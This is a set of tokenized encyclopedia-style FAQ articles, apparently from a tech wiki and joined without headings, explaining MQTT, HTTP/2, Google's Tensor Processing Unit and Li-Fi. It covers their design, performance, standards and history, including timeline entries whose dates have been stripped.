Comparing MQTT against HTTP .
Source : FIWARE 2020 .
MQTT is a publish / subscribe messaging transport protocol .
It has low complexity , small code footprint and consumes low network bandwidth for messaging .
The lightweight protocol and small packet size support makes it suitable for applications such as Machine to Machine ( M2 M ) and Internet of Things ( IoT ) .
The protocol runs over network protocols like TCP / IP that provide ordered , lossless , bidirectional connections .
MQTT - SN v1.2 , MQTT for Sensor Networks ( formerly known as MQTT - S ) , is a version of the protocol targeted at embedded devices on non - TCP / IP networks , such as Zigbee .
Connectionless network transport such as User Datagram Protocol ( UDP ) are not suitable because packets may be lost or arrive out of order .
The protocol enables transmit of messages either in 1-to-1 or 1-to - n configuration .
The messaging transport is agnostic to the content of the payload .
What 's the expansion of MQTT ?
The published OASIS standard does not give any expansion of MQTT .
MQTT used to mean MQ Telemetry Transport , where MQ is sometimes mistaken for Message Queue .
In fact , MQ referred to IBM 's MQ Series of products .
Today , MQTT is not an acronym and it does n't use traditional message queues .
How does the MQTT protocol work ?
A broker mediates between publishers and subscribers .
Source : Boyd 2014 , slide 12 .
MQTT uses the Publish / Subscribe model or pattern .
Publishers publish messages .
Subscribers receive messages if they have subscribed to the same .
However , publishers and subscribers do n't communicate with each other directly .
There 's an intermediate central Server or Broker that mediates in between .
The broker filters all incoming messages and distributes them to subscribers accordingly .
Publishers and subscribers are also called clients .
Subscribers subscribe to messages that are of interest to them .
Such filtering could be topic - based , content - based , or type - based .
Topics could be organized in a hierarchy .
With the publish / subscribe pattern , the publisher and subscribers do n't need to know each other .
They are not dependent on each other for initialization and synchronisation .
Message delivery is one - to - many and can scale with respect to subscribers without burdening publishers .
It will also be apparent that MQTT operates unlike message queues .
Messages can not get stuck in a queue if no one reads them .
In message queues , only one consumer can read the message .
Message queues are also defined explicitly , but in MQTT , topics can be created on the fly .
What are the core features of MQTT ?
The core features of MQTT are : Simple to implement : This translates to a small code and memory footprint for constrained devices .
Lightweight and network - bandwidth efficient : Payload must be transferred without significant overhead .
Handle abnormal client disconnection : Using what is called Last Will and Testament ( LWT ) , if a client has not sending anything for some time , the broker will automatically publish a message .
For example , this can be useful to inform subscribers that an IoT device ( publisher ) is not reachable .
The Transport protocol is payload data agnostic : Data can be binary , JSON or any other format .
Provides Quality - of - Service data delivery : QoS can be selected based on the needs of the application .
Supports continuous session awareness : Sessions can be continued even across intermittent network connections .
This implies clients need not subscribe again when they reconnect to the server .
Retained messages : The last published message ( with retained flag set to true ) is stored at the broker so that new subscribers can immediately obtain the last known good value rather than wait for the next update from the publisher .
Why ca n't I use HTTP instead of MQTT ?
MQTT outperforms HTTPS when sending 1024 1-byte messages to a mobile .
Source : Nicholas 2012 .
Although popular on the web , HTTP is not suitable for small data packets typical in IoT. HTTP is document - centric whereas MQTT is data - centric .
HTTP is a complex protocol .
It 's textual and therefore , parsing HTTP is not trivial .
MQTT is binary and encoding / decoding MQTT packets is a lot easier .
Because of its publish - subscribe model , data distribution is one - to - many in MQTT whereas in HTTP it 's limited to one - to - one .
A MQTT PUBLISH message header is 2 - 4 bytes ; the CONNECT message header is 14 bytes ; HTTP header can be up to 1 KB .
A C implementation of an MQTT client can be as small as 30 KB .
MQTT uses less battery power , can send more messages per hour and send them more reliably than HTTPS .
MQTT uses more battery power to initiate a connection but this is quickly compensated by gains as the connection stays open longer .
In fact , there are alternatives to MQTT that may be more suitable candidates for comparison than HTTP : AMQP , CoAP , XMPP , DDS , STOMP .
What was MQTT designed for and where is it popularly used today ?
IBM originally designed the MQTT protocol for communication between oil pipeline stations over low bandwidth satellite links .
It was later used for applications such as home automation and message broadcasting to ferries .
Other areas where it 's used include connected cars , asset tracking , smart metering , process control in manufacturing .
MQTT gained traction in IoT space due to its lightweight protocol .
One popular example of its usage is by Facebook for its Facebook Messenger application .
What are the control packets supported in MQTT ?
Typical message flow in MQTT .
Source : Rathi 2017 , slide 14 .
Control packets can be summarized into the following groups : Connection Management : CONNECT , CONNACK , DISCONNECT , PINGREQ , PINGRESP Subscription Management : SUBSCRIBE , SUBACK , UNSUBSCRIBE , UNSUBACK Message Delivery : PUBLISH , PUBACK , PUBREC , PUBREL , PUBCOMP Authentication : AUTH AUTH packet was introduced in MQTT version 5.0 .
PINGREQ is sent from client to server to indicate that the client is alive though not sending any other control packet .
What sort of Quality of Service ( QoS ) does MQTT offer ?
Message delivery at different QoS levels .
Source : Patierno 2014 , slide 8 .
The MQTT protocol defines three levels of QoS for message delivery : QoS 0 : At most once delivery .
The receiver does not send a response .
The sender does not retry and hence deletes the message locally as soon as it 's sent .
A message arrives at the receiver once or not at all .
QoS 1 : At least once delivery .
The receiver acknowledges the PUBLISH packet using the PUBACK packet .
QoS 2 : Exactly once delivered .
Neither loss nor packet duplication is acceptable .
This QoS level adds protocol overhead and specifies many rules for both sender and receiver .
Packets PUBREC , PUBREL and PUBCOMP are involved instead of PUBACK used in QoS 1 .
The Sender will retry on unacknowledged packets only if the client reconnects without a clean start and session is present .
Does MQTT support security ?
MQTT is a transport protocol that concerns message transmission .
So , security features such as privacy of data , authentication and authorization of users , etc .
have to be taken care of by the developer .
The MQTT specification provides guidance about possible implementations such as TLS .
Security - related aspects that need to be considered could be related to geography , industry or regulations .
TLS / SSL security and payload encryption can be used .
The IANA has assigned port 8883 for MQTT over SSL , or secure MQTT over TCP or UDP .
Incidentally , port 1883 is for MQTT over TCP or UDP . We should note that SSL is not exactly lightweight and adds significant overhead .
From Version 3.1 of the MQTT protocol , there are two provisions : Add username and password in the CONNECT packet . Include return codes in the CONNACK packet to report security issues . In Version 5.0 , MQTT adds the AUTH control packet .
This can be used to implement complex authentication methods such as SCRAM , Kerberos or OAuth .
There is a supplemental publication that focuses on the MQTT protocol 's integration within the NIST Framework for Improving Critical Infrastructure Cybersecurity , simply called Cybersecurity Framework .
What are the limiting factors of MQTT to consider while using it ?
Here are some limiting factors of MQTT : The structure of the published data is not known to the subscriber .
This information should be shared or known beforehand .
When topic - based filtering is used , publisher and subscribers must know the right topics to use .
The delivery of a message is not confirmed as there is no automatic confirmation from the recipient .
Moreover , the publisher also does not know if there are any subscribers .
MQTT uses TCP , which needs complex handshaking and is not easy on memory and power requirements .
Standard states that TCP is a suitable mode of transport and UDP is not .
MQTT can also use TLS or WebSocket .
Brokers are centralized .
This is not only a single point of failure but also can limit scalability .
However , real - world implementations overcome this by managing a distributed broker cluster that clients see as a single logical broker .
Examples of such cluster implementations are HiveMQ , VerneMQ , and EMQ .
MQTT has no built - in security .
Developers need to implement security on their own .
What software implementations of MQTT are available ?
Several MQTT client libraries are available based on different languages and for supporting varied devices .
Broker or server implementations and tools are also available from different vendors as noted on MQTT GitHub Wiki .
Eclipse Mosquitto , a MQTT broker implementation , is about 120kB and requires 3 MB RAM for 1000 clients connected .
The Eclipse Paho client offers a number of features : automatic reconnect , offline buffering , message persistence , WebSocket or TCP support , blocking or non - blocking API , and high availability .
For embedded devices with limited resources , Paho offers an ANSI standard C compliant library .
The RabbitMQ server uses AMQP instead of MQTT , but it offers a plugin for MQTT , making AMQP interoperable with MQTT .
MQTT was developed by Andy Stanford - Clark ( IBM ) and Arlen Nipper ( Arcom , later Eurotech ) .
It 's used to send sensor data gathered from an oil pipeline .
Data is sent to a SCADA host system via low - bandwidth links .
IBM releases MQTT V3.1 and makes it available to the public .
They define MQTT as a lightweight broker - based publish / subscribe messaging protocol designed to be open , simple , lightweight and easy to implement .
Facebook announces in a blog post that their Facebook Messenger is using MQTT .
Without it , they experienced long latency in the order of seconds .
With MQTT , it 's down to hundreds of milliseconds .
IBM and Eurotech donated MQTT code to the Eclipse Foundation .
A month later , Eclipse Foundation released the open source Java and C client code for MQTT .
Client - side MQTT code is under the project named Eclipse Paho .
Today , client code from Paho is available in a number of languages .
MQTT Version 3.1.1 is officially approved as an OASIS Standard .
In June 2016 , this was published by ISO as ISO / IEC 20922:2016 .
As MQTT broker implementation , open source Eclipse Mosquitto 1.4 is released , the first release by the Eclipse Foundation .
Version 1.0 of Mosquitto was available as early as 2012 .
The growth of MQTT can be attributed to the open - source nature of Eclipse Paho and Mosquitto .
An EMQ broker uses clustering to route messages .
Source : EMQ 2018c .
Created four years earlier by Feng Lee , version 1.0 of EMQ ( Erlang MQTT Broker ) has been released .
Written in Erlang / OTP , EMQ is open - source , distributed , and massively scalable .
Messages are routed through clusters that apply Topic Trie Match and Routing Table Lookup .
OASIS releases MQTT Version 5.0 .
It supercedes the previous standard .
Eclipse Paho 1.4.0 is expected to support this by June 2018 in C and Java .
V5.0 support from Eclipse Mosquitto is expected by August 2018 .
It 's expected that the latest version will go into production systems by Q4 2018 .
The main changes due to V5.0 are summarized by a HiveMQ blog post .
HTTP/2 is an alternative to HTTP/1.x that has been the workhorse protocol of the web for about 15 years .
The older version served well in the days when web pages were simple .
In February 2017 , an average web page was seen to have more than a hundred assets -- JS files , CSS files , images , font files , iframes embedding other content , and more .
This means that the browser has to make multiple requests to the server for a single page .
User experience is affected due to long load times .
HTTP/2 aims to solve these problems .
In particular , HTTP/2 allows multiple requests in parallel on a single TCP connection .
HTTP/1.x allowed only a single request .
HTTP/2 is also more bandwidth efficient since it uses binary encoding and compresses headers .
It allows for Server Push rather than relying only on client requests to serve content .
Are there any published results to show that HTTP/2 is better ?
As of February 2017 , a test comparing plain HTTP/1.1 against encrypted HTTP/2 showed that the former is 73 % percent slower .
The server was in Dallas and the client was in Bangalore for this test .
Early testing of HTTP/2 done in January 2015 showed that HTTP/2 uses fewer header bytes due to header compression .
Its response messages were also smaller when compared against HTTP/1.1 .
For page loads , HTTP/2 took 0.772 seconds whereas HTTP/1.1 took 0.988 seconds .
What is the support for HTTP/2 from browsers and servers ?
In 2015 , popular browsers started supporting HTTP/2 .
These include Chrome , Firefox , Safari , Opera and Edge .
Chrome for Android started support in February 2017 .
On the server side , W3Techs reported that as of February 2017 , 12 % of the servers support HTTP/2 .
Of these , 77 % were on Nginx and 18 % were on LiteSpeed .
We see that when platforms that host a number of domains start supporting HTTP/2 , there 's a spike in HTTP/2 traffic .
This can be seen when WordPress , CloudFlare , Blogspot and Wikipedia started to support the protocol .
Apache introduced it on an experimental basis in version 2.4.17 .
KeyCDN reported that as of April 2016 , 68 % of its traffic is HTTP/2 .
Are there any security vulnerabilities with HTTP/2 ?
In August 2016 , Imperva , Inc. reported four security vulnerabilities .
These should be seen as implementation flaws rather than flaws in the protocol itself .
At least one of these vulnerabilities was found in five different server implementations , which were subsequently fixed .
Is the use of encryption mandatory for HTTP/2 ?
No .
However , major browsers have said that they will support HTTP/2 only over TLS .
The use of HTTP/2 over TLS is referred to as h2 .
The use of HTTP/2 over TCP , implying clear payload , is referred to as h2c .
Do I have to change my application code when migrating to HTTP/2 ?
No .
The idea of HTTP/2 was to improve the way packets are " put on the wire .
" For reasons of interoperability , the HTTP Working Group was clear that the semantics of using HTTP should not be changed .
This means that headers , methods , status codes and cache directives present in HTTP/1.x will remain the same in HTTP/2 as well .
The semantics of HTTP remain unchanged .
Hence , the application code need not be changed .
Of course , if you 're building your own server code or custom client code , you will need to update these to support HTTP/2 .
The binary framing layer of HTTP/2 headers is not compatible with HTTP/1.x but this affects only HTTP clients and servers .
A HTTP/1.1 client can not talk to a server that supports only HTTP/2 .
If your application is using any of the well - known " best practices " for better performance over HTTP/1.1 , the recommendation is to remove these best practices .
The bigger migration challenge may be using HTTP/2 over a secure connection if your applications are not currently using TLS .
Did n't HTTP pipelining already solve this problem in HTTP/1.1 ?
HTTP pipelining .
Source : Mozilla 2016 .
HTTP/1.0 was really a stop - and - wait protocol .
The client could not make another request until a response to the pending request was received .
HTTP/1.1 attempted to solve this by introducing HTTP Pipelining , which allows a client to send multiple requests to the server in a concurrent manner .
The requirement from the server was that responses must be sent out in the same order in which requests were received .
In the real world , performance improvement due to pipelining is not proven .
Proxies when implemented wrongly can lead to erroneous behaviours .
Other factors , including round trip time , packet size and network bandwidth , affect performance .
There 's also the problem of head - of - line blocking whereby packets pending from one request can block other pipelined requests .
For these reasons , most modern browsers disable HTTP pipelining by default .
What sort of hacks did developers use to improve performance before HTTP/2 ?
Some of the " best practices " to improve performance were really hacks to overcome the limitations of HTTP/1.x .
These included domain sharding , inlining , image sprites and concatenation .
The idea was to minimize the number of requests .
With the coming of HTTP/2 , these hacks will no longer be required .
There 's one trick that browsers have used to improve performance without using HTTP pipelining .
Browsers open multiple TCP connections to enable concurrent requests .
As many as six requests were used per domain .
This is the reason why some applications deploy their content across domains so that multiple TCP connections to multiple domains will lead to faster page loads .
With HTTP/2 , multiple TCP connections will not be required .
Multiple HTTP requests can happen on a single TCP connection .
What 's the rationale for using binary encoding ?
HTTP/2 binary framing layer .
Source : Grigorik 2013 .
HTTP/1.x was a textual protocol , which made it easier to inspect and debug the messages .
But it was also inefficient to transmit .
Implementation was also complex since the presence of newlines and whitespaces resulted in variations of the message , all of which had to be decoded properly by the receiver .
Binary formats are more efficient since fewer bytes are needed .
Since the structure is fixed , decoding becomes easier .
Debugging a binary protocol is more difficult , but with the right tool support it 's not much of a problem .
Wireshark supports decoding and analysis of HTTP/2 over TLS .
Can you give some details of multiplexing HTTP requests on a single TCP connection ?
Different scenarios of stream prioritization .
Source : Grigorik and Surma 2019 .
HTTP/2 defines three things : Frame : the smallest unit of transmission that contains its own header .
Message : A sequence of frames that correspond to a HTTP request or response .
Stream : A bidirectional flow of messages and identified by a unique identifier .
Thus , multiple streams are multiplexed ( and interleaved ) on to a single TCP connection .
Each stream is independent from others , which means that even if one is blocked or delayed , others are not affected .
HTTP/2 also allows prioritization of streams , which was not possible with HTTP/1.1 .
How is header compression done in HTTP/2 ?
HPACK : Header compression for HTTP/2 .
Source : Grigorik 2013 .
Headers in HTTP/1.x can typically be 500 - 800 bytes but can grow to the order of kilobytes since applications use headers to include cookies and referers .
It therefore makes sense to compress these headers .
HPACK is the name given to HTTP/2 header compression .
It was approved by IETF in May 2015 as RFC 7541 .
Huffman coding is used to compress each header frame , which always appears at the start of each message within a stream .
In addition , many fields of the header will remain the same throughout messages .
HPACK removes this redundancy by replacing the fields with indices that point to tables that map these indices to actual values .
There are predetermined static tables defined by HPACK .
Dynamic tables allow further compression .
A test on CloudFlare gave 76 % compression for ingress headers , which translates to 53 % savings in total ingress traffic .
The equivalent numbers for egress are 69 % and 1.4 % .
Results also showed that with more traffic , the dynamic table grows , leading to higher compression .
KeyCDN reported savings of 30 % on average .
How does Server Push improve performance ?
Server Push of HTTP/2 .
Source : Imperva 2016 .
In a typical client - server interaction , the client will request one page , parse it and then figure out other assets that need to be requested from the server .
Server Push is a feature that enables the server to push assets without the client asking for them .
For example , if a HTML page references images , JS files and CSS files , the server can send these after or before sending the HTML page .
Each pushed asset is sent on its own stream and therefore can be prioritized and multiplexed individually .
Since Server Push changes the way clients and servers interact , it 's still considered experimental .
The wrong configuration could lead to worse performance .
For example , the server may push an asset even if the client has cached it from an earlier request .
Likewise , servers may push too much data and affect the user experience .
Proper use of cookies , cache - aware Server Push and correct server configuration can aid in getting Server Push right .
IETF 's HTTP Working Group began looking at Google 's SPDY protocol as a starting point for defining HTTP/2 .
IESG approves HTTP/2 as a proposed standard .
HTTP/2 is published as RFC 7540 .
TPU block diagram .
Source : Sato et al .
2017 .
The Tensor Processing Unit ( TPU ) is an ASIC announced by Google for executing Machine Learning ( ML ) algorithms .
CPUs are general purpose processors .
GPUs are more suited for graphics and tasks that can benefit from parallel execution .
DSPs work well for signal processing tasks that typically require mathematical precision .
On the other hand , TPUs are optimized for ML .
While any of the others could also be used for ML , TPUs are expected to bring better performance per watt for ML .
In fact , TPUs are said to catapult computing power seven years into the future , which is equivalent to three generations of Moore 's Law .
Google claims that TPUs are tailored for running TensorFlow , which is an open - source software library for Machine Intelligence .
What is Google 's interest in making the TPU ?
TPU Pod : 64xTPU2 .
Source : Tung 2017 , & copy ; Google .
Google has claimed that " great software shines brightest with great hardware underneath .
" This is particularly true of ML , where a TPU would offer software the requisite power to run faster and hence process more data .
Google wants to use TPUs to power its ML algorithms .
As of May 2016 , more than 100 teams are said to be using ML within Google .
Google Today , Street View , Inbox Smart Reply , RankBrain and voice search are products that are already benefiting from TPU hardware .
AlphaGo used TPUs to defeat Go world champion Lee Sedol .
Beyond Google 's internal projects , TPUs can offer an advantage for all ML applications implemented in TensorFlow .
ML applications looking to run out of a cloud infrastructure will tend to prefer Google Cloud Platform powered by TPUs .
Likewise , TPUs may be a differentiator for Google Cloud Platform when application developers select an ML service API for their applications .
For example , Google Cloud Machine Learning is a managed ML service from Google that will directly benefit from TPUs .
There 's also the claim that TPU may be Google 's answer to Intel 's Xeon processors that dominate datacenters .
Can TPUs be used for ML frameworks other than TensorFlow ?
TensorFlow is not the only framework for ML .
More specifically , there are multiple frameworks for Deep Learning ( DL ) .
Google has not disclosed if TensorFlow algorithms are hardwired into TPU or if TPU is a generic accelerator for ML .
Instead , Google has said that TPU is " tailored for TensorFlow " .
However , with the release of Cloud TPU , Facebook researcher and creator of PyTorch commented that there 's a plan to port PyTorch to TPU .
Could you compare the performance of TPU against CPU or GPU ?
TPU outperforms CPU and GPU for various neural networks in terms of predictions per second .
Source : Sato et al .
2017 .
Tests show 83x performance per watt gain over CPUs and 29x gain over GPUs .
When tested for various neural networks , in terms of predictions per second , we see a 71x gain over CPUs for the particular case of a convolutional neural network ( CNN ) of 89 layers and 100 million weights .
Within Google 's AI workloads , speed gains are in the range of 15x to 30x .
In terms of energy efficiency , gains are in the range of 30x to 80x .
Note that the numbers above are for the initial TPU version .
With later versions of TPU , we can expect higher performance gains .
How is the TPU able to achieve its superior performance compared to other processor types ?
Whereas CPUs are generic processors , the design of TPUs is focused on ML workloads .
The following design choices give it superior performance : Quantization : Integer operations are used instead of floating point operations .
Precision is sacrificed for performance .
CISC & Matrix Multiplier Unit ( MXU ) : TPU prefers CISC over RISC instruction architecture .
A single instruction can trigger complex operations that are handled by MXU .
CPUs are scalar processors ; GPUs are vector processors ; MXU is a matrix processor that can hundreds of thousands of operations in a single clock cycle .
Systolic Array : Arithmetic operations , done in Arithmetic Logic Unit ( ALU ) , are chained together , thus reducing register access .
The generality of CPUs / GPUs is sacrificed for simpler , energy - efficient design since ALUs in GPUs do the operations in fixed patterns .
Minimal & Deterministic : CPUs and GPUs have a large control logic to handle caches , branch prediction , out - of - order execution , and so on .
TPU 's control logic is only 2 % of the die .
This minimalism also makes it deterministic : we can predict execution latency .
Does n't low - precision arthimetric reduce the accuracy of calculations ?
Research has shown that deep learning algorithms are not affected by low - precision arithmetic .
In fact , low - precision arithmetic can be used for both training as well as inference .
This is because ML is essentially probabilistic in nature and high - precision arithmetic is unnecessary .
One writer reported that " having more data that is less precise yields better results than having half as much data that was more precise .
" In fact , the addition of noise during training can improve performance .
One report claimed that Google intends to use TPU only for inference .
The report added that low - precision arithmetic is not suited for training .
Since the release of TPU2 , it 's clear that these can be used for both training and inference .
With both TPU2 and TPU3 , perhaps due to ML training needs , Google 's own ` bfloat16 ` is being used for float point operations .
What 's the competition for Google 's TPU ?
Nvidia dominates the ML processor market with its GPUs .
Nvidia has specialized in its Tesla GPUs , named Pascal , that are suited for ML .
These can be used either for training or for inference .
Nvidia 's Volta equipped with 640 tensor cores is Pascal 's successor .
Movidius makes Visual Processing Units ( VPUs ) , named Myriad 2 , that offer visual intelligence at device level .
Intel announced in November 2016 an AI processor named Nervana for both training and inference .
Its first commercial version , named Nervana Neural Net L-1000 , was announced in May 2018 .
IBM 's own chip named TrueNorth is capable of deep learning inferences .
In Mid-2018 , IBM announced an unnamed prototype chip capable of both training and inference .
Microsoft has been using FPGAs in its datacenters since these can be configured easily , unlike ASICs .
In May 2018 , Microsoft announced Project Brainwave and claims that it makes Azure the fastest cloud for real - time AI .
ARM is promoting its MALI GPUs to offload ML processing from its Cortex CPUs .
Others in the AI chip space include Graphcore , Cerebras and Vathys .
Are there any performance results comparing TPUs against Nvidia 's GPUs ?
Raw throughput ( images / sec ) for training on auto - generated images without pre - processing .
Source : Haußmann 2018 .
One engineer at RiseML has compared Cloud TPU ( consisting of 4 TPUv2 ) against Nvidia 4 V100s .
In both cases , each core had 16 GB of memory .
The former was on Google Cloud while the latter was on AWS .
The performance test was on ResNet-50 .
In terms of raw throughput without any pre - processing , both had comparable results .
However , when batch sizes were decreased , V100s showed better performance .
When looking at cost , Google Cloud offers better value for money .
In the real world , we are more interested in the cost of achieving a desired level of accuracy .
Cloud TPU outperforms here , costing $ 55 for an accuracy of 75.7 % .
The same on AWS reserved instances costs $ 88 .
Cloud TPU also results in faster convergence , perhaps due to pre - processing .
V100s achieve a final accuracy of 75.7 % after 84 epochs , whereas Cloud TPU does it in only 64 epochs .
An epoch in deep learning is a single pass of the dataset through the neural networks and multiple epochs are needed for convergence .
Is Google 's TPU anyway connected to SGI 's product of the same name ?
No .
Silicon Graphics had something called a TPU in its workstations in the 2000s .
It was an advanced DSP that used dynamic shared - memory access .
This has nothing to do with Google 's TPU .
Google realizes that with the growing computational demand for neural networks , it would have to double the number of data centers .
This concern triggers the design and development of TPU ASIC .
The TPU on a PCB .
Source : Schneider 2017 , & copy ; Google .
Google announces that it 's been using TPUs in its data centers for ML for more than a year .
In its original form , it 's packaged as an external accelerator card that can be easily installed into the SATA hard disk slot .
The TPU ASIC is built on a 28 nm process , runs at 700MHz and consumes 40W. Qualcomm announces that it has optimized TensorFlow for the Hexagon 682 DSP .
Google reveals details of TPU2 , a second - generation TPU .
Each TPU2 , composed of four TPU2 chips , can deliver 180 teraflops , 64 GB of high - bandwidth memory and 2,400GB / s memory bandwidth .
These can be interconnected to make a TPU2 Pod capable of 11.5 petaflops .
As a beta release , users can use Cloud TPU on Google Cloud Platform to accelerate the training of ML models .
This is really the TPU2 offered on the cloud .
Models can now be trained overnight rather than in days or weeks .
No special programming expertise is needed ; TensorFlow can be used and reference implementations are available .
The cost is $ 6.5 / hour compared to Amazon 's $ 24 / hour .
Different versions of TPU compared .
Source : Teich 2018 .
Google announces TPU 3.0 , which requires liquid cooling .
A single TPU3 chip is capable of 90 teraflops .
Li - Fi , or Light Fidelity , uses light as a medium of data communication .
It comes under the umbrella of Optical Wireless Communication ( OWC ) that includes infrared , visible light and ultraviolet spectrum .
Li - Fi uses visible light spectrum in the downlink and infrared spectrum in the uplink .
Li - Fi promises to achieve data rates in excess of 100Gbps .
In 2014 , 10Gbps was achieved in a lab environment .
A year later , Li - Fi achieved 224Gbps .
These rates are many times what current Wi - Fi technology can achieve .
For this reason , Li - Fi can be categorized as a gigabit communication technology .
Li - Fi is expected to complement cellular and Wi - Fi technologies , not replace them .
While some proprietary Li - Fi products exist in the market , Li - Fi still has some way to go to become standardized and mainstream .
Why do we need Li - Fi when plenty of wireless technologies exist today ?
A comparison of VLC and RF .
Source : Samsung et al .
, 2008 , slide 9 .
Among the widely deployed wireless technologies are cellular , Wi - Fi and Bluetooth .
These operate at radio frequencies of less than 10GHz .
This RF spectrum is getting increasingly crowded , and there 's a growing demand for more capacity and higher speeds .
The visible light spectrum is an appealing alternative .
The visible spectrum 's capacity is 10,000 times larger .
In fact , it 's about 670THz of license - free spectrum .
Cellulars can offer higher capacity by making cells smaller , but this incurs heavy investment in infrastructure such as base station equipment and transmission towers .
LED lighting is becoming common worldwide and this infrastructure can be reused for Li - Fi .
This also means that off - the - shelf components such as LEDs can be used to keep costs down .
In contrast , millimetre wave technology at 60GHz requires specialized components .
From the perspective of availability , we 're often asked to turn off wireless transmitting devices in aircraft , hospitals and other places where EMI can cause problems .
Light is everywhere and there 's no problem using it in these places .
The Line - of - sight and short range characteristics of Li - Fi imply better security and less co - channel interference .
What are some use cases of Li - Fi ?
Proposed use cases of Li - Fi .
Source : Serafimovski et al .
, 2017 , slide 10 .
Applications that require hundreds of Mbps throughput or microseconds of latency will benefit from Li - Fi .
In dense urban areas , Li - Fi indoor attocells can complement cellular infrastructure .
Li - Fi can be used for cellular or attocell backhauls .
Li - Fi can enable Augmented Reality applications .
Lighting in a museum can give rich information and interaction around exhibits .
At malls , offers can be delivered via Li - Fi .
Many household appliances can get connected via Li - Fi , thus enabling the Internet of Things .
Li - Fi can also be used for indoor location tracking and navigation .
Li - Fi can enable smart wearables .
Because Li - Fi can not get through walls , it suits applications that require high security .
Only those within the beam of the transmitter can receive data .
In environments where radio waves are considered harmful , Li - Fi can be a safe alternative .
Radio waves are easily attenuated underwater but this problem does n't exist for Li - Fi .
Vehicle lights can be used for vehicle - to - vehicle , vehicle - to - traffic - light communication and thereby enable autonomous driving technology .
What are some important technical details of Li - Fi ?
Spectrum : Visible spectrum is approximately in the range 400 - 700 nm or 430 - 750THz .
Spectrum above 3THz is unregulated .
Bandwidth : LED BW is limited to 20MHz but system BW of 180MHz with 512 subcarriers of DMT waveform has been possible .
Area spectral efficiency : At least 0.41 bits / s / Hz / m2 , which is already 1000x of RF systems .
Modulation : Simple methods such as OOK or PWM experience ISI at high data rates .
Instead , OFDM or DMT can be used to control light intensity rather than just turning LEDs on and off .
There 's been significant research to make these methods unipolar .
DMO - OFDM is an example .
Multiple access : OFDMA is a suitable method and it 's already used in IEEE 802.11 and LTE standards .
An alternative method would be Wavelength Division Multiple Access ( WDMA ) .
Duplexing : Wavelength Division Duplexing ( WDD ) is the proposed method .
Visible spectrum is used for the downlink while IR or RF spectrum is used for the uplink .
Topology : Peer - to - peer , star or broadcast .
Is Li - Fi a proprietary technology or is there a standard for it ?
Possible standards for Li - Fi .
Source : Serafimovski et al .
, 2017 , slide 40 .
In 2011 , IEEE Task Group ( TG ) 7 released the 802.15.7 standard titled " Short - Range Wireless Optical Communication Using Visible Light " .
In March 2017 , IEEE Task Group 13 started looking into making a new standard 802.15.13 titled " Multi - Gigabit / s Optical Wireless Communications " .
It 's been said that IEEE 802.15.7 m is focusing on optical camera communications and low rate photodiode communications while IEEE 802.15.13 is for speciality networks for industrial applications .
The IEEE 802.11 is also involved in standardizing Li - Fi to complement Wi - Fi .
This group suggests that using 802.11 as the base would be a plus for mass deployment and to complement RF spectrum .
Meanwhile , existing Li - Fi products and their deployments must be considered as proprietary .
Any attempt to standardize Li - Fi will likely require support from patent owners .
How does Li - Fi stack up against Wi - Fi ?
Wi - Fi is based on RF , which relies on electric fields to carry information .
Li - Fi relies on optical intensity .
RF is complex - valued and bipolar while Li - Fi is real - values and unipolar ( non - negative ) .
Li - Fi has the advantage over Wi - Fi in terms of capacity : 10,000 times more capacity .
Visible light spectrum is being used for lighting but not for communication yet .
Hence , this spectrum is free of interference .
Wi - Fi IEEE 802.11ac has a theoretical maximum throughput of about 7Gbps but practical values are at best 200Mbps .
LED lighting infrastructure is already installed in many places and can be reused for Li - Fi communications .
The cost of LEDs is also dropping .
Moreover , solar panels can be used as Li - Fi receivers for data sent from laser stations or lamp posts .
Hence , Li - Fi has a better proposition in terms of cost and efficiency .
Li - Fi can also be used in places such as aircraft and hospitals where EMI due to RF is usually a concern .
For location - aware services , Li - Fi may complement iBeacon .
Li - Fi can be seen as complementing Wi - Fi .
Research is ongoing regarding hybrid Li - Fi / Wi - Fi networks .
What are the common criticisms of Li - Fi ?
Li - Fi systems need to emit and capture light , implying that they ca n't be used at night .
IR spectrum could be used at night but at the expense of throughput .
In bright sunlight , Li - Fi systems may not work that well due to light interference .
Li - Fi has limited range and requires line - of - sight .
However , the use of OFDM along with M - QAM can enable non - LOS communications .
Concerns about lower LED energy efficiency when used for Li - Fi have been dispelled .
While Harald Haas has claimed that existing lighting infrastructure can be used , the reality is that LEDs come in many varieties and there will be compatibility issues with Li - Fi adapters .
Moreover , electrical wiring will need to be converted to network wiring for the transmission of data .
Consumer devices will need to be replaced to handle Li - Fi signals .
For immediate adoption , a temporary issue is that Li - Fi is not a mature technology and the standards are not yet in place .
When Li - Fi last mile is achieving hundreds of gigabits per second , backhaul infrastructure also needs to scale equivalently .
However , backhauls reaching a few terabits per second have been reported .
What are the essential components of Li - Fi ?
Li - Fi system overview .
Source : Gupta , 2017 .
Li - Fi uses LEDs as transmitters and photodetectors / photodiodes as receivers .
The former can be phosphor - coated LEDs or RGB LEDs .
For receivers , photodiodes can be p - intrinsic - n ( PIN ) photodiodes or avalanche photodiodes ( APD ) .
Off - the - shelf components can be used for these but they need to be driven by signal processing firmware to make them communication devices .
Recent advancements include Resonant Cavity LEDs and MicroLEDs that achieve higher data rates .
LEDs have a trade - off between output power and optical efficiency .
To solve this , Laser Diodes ( LD ) have been proposed to target more than 100Gbps data rates .
Japanese researchers report the use of white LEDs to transmit information at 400Mbps while also serving the primary purpose of indoor lighting .
The Visible Light Communications Consortium ( VLCC ) has been established , comprising of major companies in Japan .
The aim is to provide communication capability through LED lighting .
OFDM is first used for VLC since the high crest factor that 's usually a problem for radio communications is not an issue for VLC when intensity modulation and direct detection is used .
Scottish Enterprise funds a project named " D - Light " .
Project work began in January 2010 at the University of Edinburgh .
Project objectives mention the use of off - the - shelf LEDs to achieve 100Mbps under normal lighting , BER of 10E-4 , 1 - 4 m range and real - time signal processing .
Thus , the project has a strong practical rather than academic focus .
At the TEDGlobal event , Harald Haas created the term Li - Fi , which stands for Light Fidelity .
He explains four limitations to radio communications : capacity , efficiency , availability , security .
He claims that Li - Fi overcomes these limitations .
A few months later , D - Light project member Gordon Povey announces that project goals have been met with a measured data rate of 102.5Mbps .
The Li - Fi Consortium has been launched to promote Optical Wireless Communications ( OWC ) .
While Visible Light Communications ( VLC ) considers only the visible spectrum , OWC includes infrared as well .
Italian researchers achieved a 1Gbps data rate using Discrete Multitone ( DMT ) modulation .
Researchers at the University of Oxford reported a Li - Fi speed of 224Gbps by aggregating six channels with each channel achieving 37.4Gbps .
Harald Haas demonstrates the use of solar cells as Li - Fi receivers while at the same time converting light energy to electrical energy .
The company PureLiFi claims to deliver 45Mbps with its Li - Fi products .
